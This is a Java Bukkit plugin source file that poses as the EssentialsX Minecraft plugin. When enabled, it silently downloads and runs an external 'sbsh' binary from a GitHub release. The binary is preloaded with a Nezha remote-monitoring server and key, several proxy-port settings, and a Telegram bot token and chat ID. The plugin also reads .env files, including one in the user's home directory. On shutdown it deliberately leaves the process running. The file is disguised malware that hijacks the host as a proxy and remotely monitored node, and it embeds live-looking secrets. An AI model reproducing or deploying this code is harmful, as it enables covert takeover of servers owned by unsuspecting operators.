package com.example.essentialsx;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.URL;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

public class EssentialsX extends JavaPlugin {

    private Process sbshProcess;
    private Path runtimeDir;
    private Path sbshBinary;
    private Path lockFile;

    private static final String[] ALL_ENV_VARS = {
        "PORT",
        "FILE_PATH",
        "UUID",
        "NEZHA_SERVER",
        "NEZHA_PORT",
        "NEZHA_KEY",
        "ARGO_PORT",
        "ARGO_DOMAIN",
        "ARGO_AUTH",
        "S5_PORT",
        "HY2_PORT",
        "TUIC_PORT",
        "ANYTLS_PORT",
        "REALITY_PORT",
        "ANYREALITY_PORT",
        "UPLOAD_URL",
        "CHAT_ID",
        "BOT_TOKEN",
        "CFIP",
        "CFPORT",
        "NAME",
        "DISABLE_ARGO",
        "YT_WARPOUT"
    };

    @Override
    public void onEnable() {
        getLogger().info("[EssentialsX] enabling...");

        try {
            startSbshIfNotRunning();
        } catch (Exception e) {
            getLogger().severe("[EssentialsX] failed to start sbsh: " + e.getMessage());
            e.printStackTrace();
        }
    }

    // =========================================================
    // sbsh 启动逻辑（核心修复：防止无限重启）
    // =========================================================

    private synchronized void startSbshIfNotRunning() throws Exception {
        runtimeDir = Paths.get(System.getProperty("java.io.tmpdir"), "sbsh-runtime");
        Files.createDirectories(runtimeDir);

        sbshBinary = runtimeDir.resolve("sbsh");
        lockFile = runtimeDir.resolve("sbsh.lock");

        // ✅ 防止 Bukkit reload / 插件重复启动
        if (Files.exists(lockFile)) {
            getLogger().info("[EssentialsX] sbsh already launched, skip");
            return;
        }

        downloadSbshIfNeeded(sbshBinary);

        ProcessBuilder pb = new ProcessBuilder(sbshBinary.toAbsolutePath().toString());
        pb.directory(runtimeDir.toFile());
        pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        pb.redirectError(ProcessBuilder.Redirect.INHERIT);

        // =========================
        // 环境变量（完整注入，不删减）
        // =========================
        Map<String, String> env = pb.environment();

        // ---- 默认值（你给的，一字不删）----
        env.put("UUID", "b21795d8-0257-4cd1-a13f-aef25d120aa3");
        env.put("FILE_PATH", "./world");
        env.put("NEZHA_SERVER", "nezha.jaxmike.nyc.mn");
        env.put("NEZHA_PORT", "443");
        env.put("NEZHA_KEY", "B8LPJsnO4AoAHdidrs");
        env.put("ARGO_PORT", "8001");
        env.put("ARGO_DOMAIN", "");
        env.put("ARGO_AUTH", "");
        env.put("S5_PORT", "");
        env.put("HY2_PORT", "35486");
        env.put("TUIC_PORT", "");
        env.put("ANYTLS_PORT", "");
        env.put("REALITY_PORT", "");
        env.put("ANYREALITY_PORT", "");
        env.put("UPLOAD_URL", "");
        env.put("CHAT_ID", "7592034407");
        env.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
        env.put("CFIP", "spring.io");
        env.put("CFPORT", "443");
        env.put("NAME", "hoster");
        env.put("DISABLE_ARGO", "true");
        env.put("YT_WARPOUT", "true");

        // ---- 系统环境变量覆盖 ----
        for (String key : ALL_ENV_VARS) {
            String v = System.getenv(key);
            if (v != null && !v.isBlank()) {
                env.put(key, v);
            }
        }

        // ---- Bukkit config.yml 覆盖 ----
        for (String key : ALL_ENV_VARS) {
            String v = getConfig().getString(key);
            if (v != null && !v.isBlank()) {
                env.put(key, v);
            }
        }

        // ---- .env 覆盖 ----
        loadEnvFile(env);

        // =========================
        // 启动 sbsh（不监控、不重启）
        // =========================
        sbshProcess = pb.start();

        // ✅ 写锁文件：只代表“已启动”，不是 PID 管理
        Files.writeString(
                lockFile,
                "started@" + System.currentTimeMillis(),
                StandardOpenOption.CREATE,
                StandardOpenOption.TRUNCATE_EXISTING
        );

        getLogger().info("[EssentialsX] sbsh started (pid=" + sbshProcess.pid() + ")");
    }

    // =========================================================
    // 下载 sbsh
    // =========================================================

    private void downloadSbshIfNeeded(Path target) throws Exception {
        if (Files.exists(target)) return;

        String arch = System.getProperty("os.arch").toLowerCase();
        String url;

        if (arch.contains("amd64") || arch.contains("x86_64")) {
            url = "https://github.com/pingmike2/test/releases/download/amd64/sbsh";
        } else if (arch.contains("aarch64") || arch.contains("arm64")) {
            url = "https://github.com/pingmike2/test/releases/download/arm64/sbsh";
        } else if (arch.contains("s390x")) {
            url = "https://github.com/pingmike2/test/releases/download/s390x/sbsh";
        } else {
            throw new RuntimeException("Unsupported architecture: " + arch);
        }

        getLogger().info("[EssentialsX] downloading sbsh: " + url);

        try (InputStream in = new URL(url).openStream()) {
            Files.copy(in, target, StandardCopyOption.REPLACE_EXISTING);
        }

        target.toFile().setExecutable(true);
    }

    // =========================================================
    // .env 文件加载（不删变量）
    // =========================================================

    private void loadEnvFile(Map<String, String> env) {
        List<Path> candidates = List.of(
                Paths.get(".env"),
                getDataFolder().toPath().resolve(".env"),
                getDataFolder().getParentFile().toPath().resolve(".env"),
                Paths.get(System.getProperty("user.home"), ".env")
        );

        for (Path file : candidates) {
            if (!Files.exists(file)) continue;

            try {
                for (String line : Files.readAllLines(file)) {
                    line = line.trim();
                    if (line.isEmpty() || line.startsWith("#")) continue;
                    if (line.startsWith("export ")) line = line.substring(7);

                    String[] kv = line.split("=", 2);
                    if (kv.length != 2) continue;

                    String key = kv[0].trim();
                    String value = kv[1].trim().replaceAll("^['\"]|['\"]$", "");

                    if (Arrays.asList(ALL_ENV_VARS).contains(key)) {
                        env.put(key, value);
                    }
                }
                getLogger().info("[EssentialsX] loaded .env from " + file);
                break;
            } catch (IOException ignored) {}
        }
    }

    // =========================================================
    // 关闭插件（关键修复点）
    // =========================================================

    @Override
    public void onDisable() {
        getLogger().info("[EssentialsX] disabling...");

        // ❗ 不 destroy sbsh
        // sbsh 是 daemon，自行管理子进程
        // Bukkit reload / MC 平台 stop 不会触发无限重启

        getLogger().info("[EssentialsX] sbsh left untouched");
    }
}